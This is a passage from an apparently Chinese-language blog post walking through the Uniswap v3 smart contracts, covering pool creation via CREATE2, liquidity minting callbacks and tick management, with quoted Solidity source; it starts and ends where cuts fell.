NFT token 将流动性代币化。使用 ERC721 token（v2 使用的是 ERC20）的原因是同一个池的多个流动性并不能等价替换（v3 的集中流性动功能）。</li></ul><p><img src="uniswap_structur.png" alt=""><br>这是uniswap v3基本的一个架构，其主要业务流程是在Management和Pool之间进行交互。<br>NonfungiblePositionManager负责交易池的创建以及流动性的添加删除。SwapRouter是swap路由的管理。UniswapV3Factory是交易池(UniswapV3Pool)统一创建的接口。UniswapV3Pool由UniswapV3PoolDeployer统一部署。UniswapV3Pool是核心逻辑，管理了Tick和Position，实现流动性管理以及一个交易池中swap功能实现。每个Pool中的Position都做成了ERC721的Token。也就是说，每个Position都有独立的ERC721的Token ID。</p><h3 id="创建交易对"><a href="#创建交易对" class="headerlink" title="创建交易对"></a>创建交易对</h3><p>创建交易对的调用流程如下：<br><img src="uniswap_pair.png" alt=""><br>用户首先调用<code>NonfungiblePositionManager</code>合约继承的<code>createAndInitializePoolIfNecessary</code>方法创建交易对，传入的参数为交易对的 token0, token1, fee 和初始价格。</p><p>createAndInitializePoolIfNecessary 如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function createAndInitializePoolIfNecessary(</span><br><span class="line">        address token0,</span><br><span class="line">        address token1,</span><br><span class="line">        uint24 fee,</span><br><span class="line">        uint160 sqrtPriceX96</span><br><span class="line">    ) external payable override returns (address pool) &#123;</span><br><span class="line">        require(token0 &lt; token1);</span><br><span class="line">        pool &#x3D; IUniswapV3Factory(factory).getPool(token0, token1, fee);</span><br><span class="line"></span><br><span class="line">        if (pool &#x3D;&#x3D; address(0)) &#123;</span><br><span class="line">            pool &#x3D; IUniswapV3Factory(factory).createPool(token0, token1, fee);  &#x2F;&#x2F;创建pool</span><br><span class="line">            IUniswapV3Pool(pool).initialize(sqrtPriceX96);                      &#x2F;&#x2F;初始化</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            (uint160 sqrtPriceX96Existing, , , , , , ) &#x3D; IUniswapV3Pool(pool).slot0();</span><br><span class="line">            if (sqrtPriceX96Existing &#x3D;&#x3D; 0) &#123;</span><br><span class="line">                IUniswapV3Pool(pool).initialize(sqrtPriceX96);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p><code>createAndInitializePoolIfNecessary</code>方法内部通过调用 UniswapV3Factory 的 <code>createPool</code> 方法完成交易对的创建，然后对交易对进行初始化，初始化的作用就是给交易对设置一个初始的价格。</p><p>首先调用<code>UniswapV3Factory.getPool</code>方法查看交易对是否已经创建,<code>getPool</code>函数是 solidity 自动为 <code>UniswapV3Factory</code> 合约中的状态变量<code>getPool</code>生成的外部函数<code>getPool</code>的数据类型为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">contract UniswapV3Factory is IUniswapV3Factory, UniswapV3PoolDeployer, NoDelegateCall &#123;</span><br><span class="line">    ...</span><br><span class="line">    mapping(address &#x3D;&gt; mapping(address &#x3D;&gt; mapping(uint24 &#x3D;&gt; address))) public override getPool;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 3个 map 说明了 v3 版本使用 (tokenA, tokenB, fee) 来作为一个交易对的键，即相同代币，不同费率之间的流动池不一样。另外对于给定的 tokenA 和 tokenB，会先将其地址排序，将地址值更小的放在前，这样方便后续交易池的查询和计算。</p><p>再来看 UniswapV3Factory <strong>创建交易对的过程</strong>，实际上它是调用<code>deploy</code>函数完成交易对的创建：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function deploy(</span><br><span class="line">    address factory,</span><br><span class="line">    address token0,</span><br><span class="line">    address token1,</span><br><span class="line">    uint24 fee,</span><br><span class="line">    int24 tickSpacing</span><br><span class="line">) internal returns (address pool) &#123;</span><br><span class="line">    parameters &#x3D; Parameters(&#123;factory: factory, token0: token0, token1: token1, fee: fee, tickSpacing: tickSpacing&#125;);</span><br><span class="line">    pool &#x3D; address(new UniswapV3Pool&#123;salt: keccak256(abi.encode(token0, token1, fee))&#125;());</span><br><span class="line">    delete parameters;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这里采用了<code>Create2</code>的方式创建Pool池，关于Create2的使用，可以看我的另一篇文章。<br>这里简单讲一下使用Create2的好处</p><ul><li>可以在链下计算出已经创建的交易池的地址</li><li>其他合约不必通过<code>UniswapV3Factory</code>中的接口来查询交易池的地址，可以节省 gas</li><li>合约地址不会因为 reorg 而改变</li></ul><p>我们再来看一下<code>UniswapV3Pool</code>的构造函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">constructor() &#123;</span><br><span class="line">    int24 _tickSpacing;</span><br><span class="line">    (factory, token0, token1, fee, _tickSpacing) &#x3D; IUniswapV3PoolDeployer(msg.sender).parameters();</span><br><span class="line">    tickSpacing &#x3D; _tickSpacing;</span><br><span class="line"></span><br><span class="line">    maxLiquidityPerTick &#x3D; Tick.tickSpacingToMaxLiquidityPerTick(_tickSpacing);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比较值得注意的是这里反向查询了Deployer里面的<code>parameters</code>变量进行赋值，而不是通过传参的方式。<br>其实是因为Create2。这是因为<code>CREATE2</code>会将合约的 <code>initcode</code> 和 <code>salt</code> 一起用来计算创建出的合约地址。而 <code>initcode</code> 是包含 <code>contructor code</code> 和其参数的，如果合约的 <code>constructor</code> 函数包含了参数，那么其 initcode将因为其传入参数不同而不同。</p><p>为了让合约地址的计算更简单，这里的 constructor 不包含参数（这样合约的 initcode 将时唯一的），是使用动态 call 的方式来获取其创建参数。</p><p>最后，对创建的交易对合约进行初始化：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function initialize(uint160 sqrtPriceX96) external override &#123;</span><br><span class="line">    require(slot0.sqrtPriceX96 &#x3D;&#x3D; 0, &#39;AI&#39;);</span><br><span class="line"></span><br><span class="line">    int24 tick &#x3D; TickMath.getTickAtSqrtRatio(sqrtPriceX96);</span><br><span class="line"></span><br><span class="line">    (uint16 cardinality, uint16 cardinalityNext) &#x3D; observations.initialize(_blockTimestamp());</span><br><span class="line"></span><br><span class="line">    slot0 &#x3D; Slot0(&#123;</span><br><span class="line">        sqrtPriceX96: sqrtPriceX96,</span><br><span class="line">        tick: tick,</span><br><span class="line">        observationIndex: 0,</span><br><span class="line">        observationCardinality: cardinality,</span><br><span class="line">        observationCardinalityNext: cardinalityNext,</span><br><span class="line">        feeProtocol: 0,</span><br><span class="line">        unlocked: true</span><br><span class="line">    &#125;);</span><br><span class="line">    &#x2F;&#x2F; 此时池子中还没有流动性</span><br><span class="line">    emit Initialize(sqrtPriceX96, tick);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>初始化主要是设置了交易池的初始价格（注意，此时池子中还没有流动性），以及费率，tick 等相关变量的初始化。完成之后一个交易池就创建好了。</p><h3 id="提供流动性"><a href="#提供流动性" class="headerlink" title="提供流动性"></a>提供流动性</h3><p>在合约内 v3会保存所有用户的流动性，代码内称作<code>Position</code>，<br><img src="uniswap10.png" alt=""><br>用户还是首先和<code>NonfungiblePositionManager</code>合约交互,调用<code>mint</code>函数，mint函数会调用<code>LiquidityManagement.sol</code>里的<code>addLiquidity</code>函数，来进行流动性的增添。v3 这次将 ERC20 的 LP token 改成了 ERC721 token，并且将 token 功能放到<code>NonfungiblePositionManager</code>合约中。这个合约替代用户完成提供流动性操作，然后根据将流动性的数据元记录下来，并给用户铸造一个 NFT Token.</p><p>我们先来看添加流动性的函数:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">struct AddLiquidityParams &#123;</span><br><span class="line">    address token0;     &#x2F;&#x2F; token0 的地址</span><br><span class="line">    address token1;     &#x2F;&#x2F; token1 的地址</span><br><span class="line">    uint24 fee;         &#x2F;&#x2F; 交易费率</span><br><span class="line">    address recipient;  &#x2F;&#x2F; 流动性的所属人地址</span><br><span class="line">    int24 tickLower;    &#x2F;&#x2F; 流动性的价格下限（以 token0 计价），这里传入的是 tick index</span><br><span class="line">    int24 tickUpper;    &#x2F;&#x2F; 流动性的价格上线（以 token0 计价），这里传入的是 tick index</span><br><span class="line">    uint128 amount;     &#x2F;&#x2F; 流动性 L 的值</span><br><span class="line">    uint256 amount0Max; &#x2F;&#x2F; 提供的 token0 上限数</span><br><span class="line">    uint256 amount1Max; &#x2F;&#x2F; 提供的 token1 上限数</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function addLiquidity(AddLiquidityParams memory params)</span><br><span class="line">    internal</span><br><span class="line">    returns (</span><br><span class="line">        uint256 amount0,</span><br><span class="line">        uint256 amount1,</span><br><span class="line">        IUniswapV3Pool pool</span><br><span class="line">    )</span><br><span class="line">&#123;</span><br><span class="line">    PoolAddress.PoolKey memory poolKey &#x3D;</span><br><span class="line">        PoolAddress.PoolKey(&#123;token0: params.token0, token1: params.token1, fee: params.fee&#125;);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 这里不需要访问 factory 合约，可以通过 token0, token1, fee 三个参数计算出 pool 的合约地址</span><br><span class="line">    pool &#x3D; IUniswapV3Pool(PoolAddress.computeAddress(factory, poolKey));</span><br><span class="line"></span><br><span class="line">    (amount0, amount1) &#x3D; pool.mint(</span><br><span class="line">        params.recipient,</span><br><span class="line">        params.tickLower,</span><br><span class="line">        params.tickUpper,</span><br><span class="line">        params.amount,</span><br><span class="line">        &#x2F;&#x2F; pool 合约回调所使用的参数</span><br><span class="line">        abi.encode(MintCallbackData(&#123;poolKey: poolKey, payer: msg.sender&#125;))</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    require(amount0 &lt;&#x3D; params.amount0Max);</span><br><span class="line">    require(amount1 &lt;&#x3D; params.amount1Max);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h4><p>在uniswap v3中有个比较特殊的设计就是在提供流动性的流程中，不是在代码逻辑内部进行token和流动性的转换，而实通过回调函数的方式进行<strong>转账</strong>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">struct MintCallbackData &#123;</span><br><span class="line">    PoolAddress.PoolKey poolKey;</span><br><span class="line">    address payer;         &#x2F;&#x2F; 支付 token 的地址</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;&#x2F; @inheritdoc IUniswapV3MintCallback</span><br><span class="line">function uniswapV3MintCallback(</span><br><span class="line">    uint256 amount0Owed,</span><br><span class="line">    uint256 amount1Owed,</span><br><span class="line">    bytes calldata data</span><br><span class="line">) external override &#123;</span><br><span class="line">    MintCallbackData memory decoded &#x3D; abi.decode(data, (MintCallbackData));</span><br><span class="line">    CallbackValidation.verifyCallback(factory, decoded.poolKey);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 根据传入的参数，使用 transferFrom 代用户向 Pool 中支付 token</span><br><span class="line">    if (amount0Owed &gt; 0) pay(decoded.poolKey.token0, decoded.payer, msg.sender, amount0Owed);</span><br><span class="line">    if (amount1Owed &gt; 0) pay(decoded.poolKey.token1, decoded.payer, msg.sender, amount1Owed);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>使用回调函数原因是，将<code>Position</code>的<code>owner</code>和实际流动性<code>token</code>支付者解耦。这样可以让中间合约来管理用户的流动性，并将流动性<code>token</code>化。关于<code>token</code>化，Uniswap v3 默认实现了 ERC721 token（因为即使是同一个池子，流动性之间差异也也很大）。</p><h4 id="Tick管理"><a href="#Tick管理" class="headerlink" title="Tick管理"></a>Tick管理</h4><p>Tick合约包含用于管理报价过程和相关计算的函数，下面我们进行逐一分析：</p><p>首先声明一个<code>info</code>结构体，用于存储每个初始化后个人的trick信息，具体代码如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">struct Info &#123;</span><br><span class="line">    &#x2F;&#x2F; the total position liquidity that references this tick</span><br><span class="line">    uint128 liquidityGross;</span><br><span class="line">    &#x2F;&#x2F; amount of net liquidity added (subtracted) when tick is crossed from left to right (right to left),</span><br><span class="line">    int128 liquidityNet;</span><br><span class="line">    &#x2F;&#x2F; fee growth per unit of liquidity on the _other_ side of this tick (relative to the current tick)</span><br><span class="line">    &#x2F;&#x2F; only has relative meaning, not absolute — the value depends on when the tick is initialized</span><br><span class="line">    uint256 feeGrowthOutside0X128;</span><br><span class="line">    uint256 feeGrowthOutside1X128;</span><br><span class="line">    &#x2F;&#x2F; the cumulative tick value on the other side of the tick</span><br><span class="line">    int56 tickCumulativeOutside;</span><br><span class="line">    &#x2F;&#x2F; the seconds per unit of liquidity on the _other_ side of this tick (relative to the current tick)</span><br><span class="line">    &#x2F;&#x2F; only has relative meaning, not absolute — the value depends on when the tick is initialized</span><br><span class="line">    uint160 secondsPerLiquidityOutsideX128;</span><br><span class="line">    &#x2F;&#x2F; the seconds spent on the other side of the tick (relative to the current tick)</span><br><span class="line">    &#x2F;&#x2F; only has relative meaning, not absolute — the value depends on when the tick is initialized</span><br><span class="line">    uint32 secondsOutside;</span><br><span class="line">    &#x2F;&#x2F; true iff the tick is initialized, i.e. the value is exactly equivalent to the expression liquidityGross !&#x3D; 0</span><br><span class="line">    &#x2F;&#x2F; these 8 bits are set to prevent fresh sstores when crossing newly initialized ticks</span><br><span class="line">    bool initialized;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><code>tickSpacingToMaxLiquidityPerTick</code>函数用于根据给定的tickSpacing得出每一个trick的最大流动性值：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;e.g., a tickSpacing of 3 requires ticks to be initialized every 3rd tick i.e., ..., -6, -3, 0, 3, 6, ...</span><br><span class="line">&#x2F;&#x2F; @return The max liquidity per tick</span><br><span class="line">function tickSpacingToMaxLiquidityPerTick(int24 tickSpacing) internal pure returns (uint128) &#123;</span><br><span class="line">    int24 minTick &#x3D; (TickMath.MIN_TICK &#x2F; tickSpacing) * tickSpacing;</span><br><span class="line">    int24 maxTick &#x3D; (TickMath.MAX_TICK &#x2F; tickSpacing) * tickSpacing;</span><br><span class="line">    uint24 numTicks &#x3D; uint24((maxTick - minTick) &#x2F; tickSpacing) + 1;</span><br><span class="line">    return type(uint128).max &#x2F; numTicks;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>getFeeGrowthInside</code>函数用于检查费用增长的数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">function getFeeGrowthInside(</span><br><span class="line">    mapping(int24 &#x3D;&gt; Tick.Info) storage self,</span><br><span class="line">    int24 tickLower,</span><br><span class="line">    int24 tickUpper,</span><br><span class="line">    int24 tickCurrent,</span><br><span class="line">    uint256 feeGrowthGlobal0X128,</span><br><span class="line">    uint256 feeGrowthGlobal1X128</span><br><span class="line">) internal view returns (uint256 feeGrowthInside0X128, uint256 feeGrowthInside1X128) &#123;</span><br><span class="line">    Info storage lower &#x3D; self[tickLower];</span><br><span class="line">    Info storage upper &#x3D; self[tickUpper];</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; calculate fee growth below</span><br><span class="line">    uint256 feeGrowthBelow0X128;</span><br><span class="line">    uint256 feeGrowthBelow1X128;</span><br><span class="line">    if (tickCurrent &gt;&#x3D; tickLower) &#123;</span><br><span class="line">        feeGrowthBelow0X128 &#x3D; lower.feeGrowthOutside0X128;</span><br><span class="line">        feeGrowthBelow1X128 &#x3D; lower.feeGrowthOutside1X128;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        feeGrowthBelow0X128 &#x3D; feeGrowthGlobal0X128 - lower.feeGrowthOutside0X128;</span><br><span class="line">        feeGrowthBelow1X128 &#x3D; feeGrowthGlobal1X128 - lower.feeGrowthOutside1X128;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; calculate fee growth above</span><br><span class="line">    uint256 feeGrowthAbove0X128;</span><br><span class="line">    uint256 feeGrowthAbove1X128;</span><br><span class="line">    if (tickCurrent &lt; tickUpper) &#123;</span><br><span class="line">        feeGrowthAbove0X128 &#x3D; upper.feeGrowthOutside0X128;</span><br><span class="line">        feeGrowthAbove1X128 &#x3D; upper.feeGrowthOutside1X128;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        feeGrowthAbove0X128 &#x3D; feeGrowthGlobal0X128 - upper.feeGrowthOutside0X128;</span><br><span class="line">        feeGrowthAbove1X128 &#x3D; feeGrowthGlobal1X128 - upper.feeGrowthOutside1X128;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    feeGrowthInside0X128 &#x3D; feeGrowthGlobal0X128 - feeGrowthBelow0X128 - feeGrowthAbove0X128;</span><br><span class="line">    feeGrowthInside1X128 &#x3D; feeGrowthGlobal1X128 - feeGrowthBelow1X128 - feeGrowthAbove1X128;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><code>update</code>函数用于更新trick，每当trick从初始化转为未初始化时需要更新trick并返回真，反之亦然.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">function update(</span><br><span class="line">    mapping(int24 &#x3D;&gt; Tick.Info) storage self,</span><br><span class="line">    int24 tick,</span><br><span class="line">    int24 tickCurrent,</span><br><span class="line">    int128 liquidityDelta,</span><br><span class="line">    uint256 feeGrowthGlobal0X128,</span><br><span class="line">    uint256 feeGrowthGlobal1X128,</span><br><span class="line">    uint160 secondsPerLiquidityCumulativeX128,</span><br><span class="line">    int56 tickCumulative,</span><br><span class="line">    uint32 time,</span><br><span class="line">    bool upper,</span><br><span class="line">    uint128 maxLiquidity</span><br><span class="line">) internal returns (bool flipped) &#123;</span><br><span class="line">    Tick.Info storage info &#x3D; self[tick];</span><br><span class="line"> </span><br><span class="line">    uint128 liquidityGrossBefore &#x3D; info.liquidityGross;</span><br><span class="line">    uint128 liquidityGrossAfter &#x3D; LiquidityMath.addDelta(liquidityGrossBefore, liquidityDelta);</span><br><span class="line"> </span><br><span class="line">    require(liquidityGrossAfter &lt;&#x3D; maxLiquidity, &#39;LO&#39;);</span><br><span class="line"> </span><br><span class="line">    flipped &#x3D; (liquidityGrossAfter &#x3D;&#x3D; 0) !&#x3D; (liquidityGrossBefore &#x3D;&#x3D; 0);</span><br><span class="line"> </span><br><span class="line">    if (liquidityGrossBefore &#x3D;&#x3D; 0) &#123;</span><br><span class="line">        &#x2F;&#x2F; by convention, we assume that all growth before a tick was initialized happened _below_ the tick</span><br><span class="line">        if (tick &lt;&#x3D; tickCurrent) &#123;</span><br><span class="line">            info.feeGrowthOutside0X128 &#x3D; feeGrowthGlobal0X128;</span><br><span class="line">            info.feeGrowthOutside1X128 &#x3D; feeGrowthGlobal1X128;</span><br><span class="line">            info.secondsPerLiquidityOutsideX128 &#x3D; secondsPerLiquidityCumulativeX128;</span><br><span class="line">            info.tickCumulativeOutside &#x3D; tickCumulative;</span><br><span class="line">            info.secondsOutside &#x3D; time;</span><br><span class="line">        &#125;</span><br><span class="line">        info.initialized &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    info.liquidityGross &#x3D; liquidityGrossAfter;</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F; when the lower (upper) tick is crossed left to right (right to left), liquidity must be added (removed)</span><br><span class="line">    info.liquidityNet &#x3D; upper</span><br><span class="line">        ? int256(info.liquidityNet).sub(liquidityDelta).toInt128()</span><br><span class="line">        : int256(info.liquidityNet).add(liquidityDelta).toInt128();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><code>clear</code>函数用于清除trick数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function clear(mapping(int24 &#x3D;&gt; Tick.Info) storage self, int24 tick) internal &#123;</span><br><span class="line">    delete self[tick];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><code>cross</code>函数用于根据价格变动的需要转换到下一个trick<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function cross(</span><br><span class="line">    mapping(int24 &#x3D;&gt; Tick.Info) storage self,</span><br><span class="line">    int24 tick,</span><br><span class="line">    uint256 feeGrowthGlobal0X128,</span><br><span class="line">    uint256 feeGrowthGlobal1X128,</span><br><span class="line">    uint160 secondsPerLiquidityCumulativeX128,</span><br><span class="line">    int56 tickCumulative,</span><br><span class="line">    uint32 time</span><br><span class="line">) internal returns (int128 liquidityNet) &#123;</span><br><span class="line">    Tick.Info storage info &#x3D; self[tick];</span><br><span class="line">    info.feeGrowthOutside0X128 &#x3D; feeGrowthGlobal0X128 - info.feeGrowthOutside0X128;</span><br><span class="line">    info.feeGrowthOutside1X128 &#x3D; feeGrowthGlobal1X128 - info.feeGrowthOutside1X128;</span><br><span class="line">    info.secondsPerLiquidityOutsideX128 &#x3D; secondsPerLiquidityCumulativeX128 - info.secondsPerLiquidityOutsideX128;</span><br><span class="line">    info.tickCumulativeOutside &#x3D; tickCumulative - info.tickCumulativeOutside;</span><br><span class="line">    info.secondsOutside &#x3D; time - info.secondsOutside;</span><br><span class="line">    liquidityNet &#x3D; info.liquidityNet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="tick-位图"><a href="#tick-位图" class="headerlink" title="tick 位图"></a>tick 位图</h4><p>tick 位图用于记录所有被引用的 lower/upper tick index，我们可以用过 tick 位图，从当前价格找到下一个（从左至右或者从右至左）被引用的 tick index。关于 tick 位图的管理，在 _updatePosition 中的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if (flippedLower) &#123;</span><br><span class="line">    tickBitmap.flipTick(tickLower, tickSpacing);</span><br><span class="line">    secondsOutside.initialize(tickLower, tick, tickSpacing, blockTimestamp);</span><br><span class="line">&#125;</span><br><span class="line">if (flippedUpper) &#123;</span><br><span class="line">    tickBitmap.flipTick(tickUpper, tickSpacing);</span><br><span class="line">    secondsOutside.initialize(tickUpper, tick, tickSpacing, blockTimestamp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这里不做进一步的说明，具体代码实现在<code>TickBitmap</code>库中。tick 位图有以下几个特性：</p><ul><li>对于不存在的 tick，不需要初始值，因为访问 map 中不存在的 key 默认值就是 0</li><li>通过对位图的每个 word(uint256) 建立索引来管理位图，即访问路径为 word index -&gt; word -&gt; tick bit</li></ul><h4 id="完成流动性添加"><a href="#完成流动性添加" class="headerlink" title="完成流动性添加"></a>完成流动性添加</h4><p><code>_modifyPosition</code>调用完成后，会返回 x token, 和 y token 的数量。再来看 UniswapV3Pool.mint 的代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">function mint(</span><br><span class="line">    address recipient,</span><br><span class="line">    int24 tickLower,</span><br><span class="line">    int24 tickUpper,</span><br><span class="line">    uint128 amount,</span><br><span class="line">    bytes calldata data</span><br><span class="line">) external override lock returns (uint256 amount0, uint256 amount1) &#123;</span><br><span class="line">    require(amount &gt; 0);</span><br><span class="line">    (, int256 amount0Int, int256 amount1Int) &#x3D;</span><br><span class="line">        _modifyPosition(</span><br><span class="line">            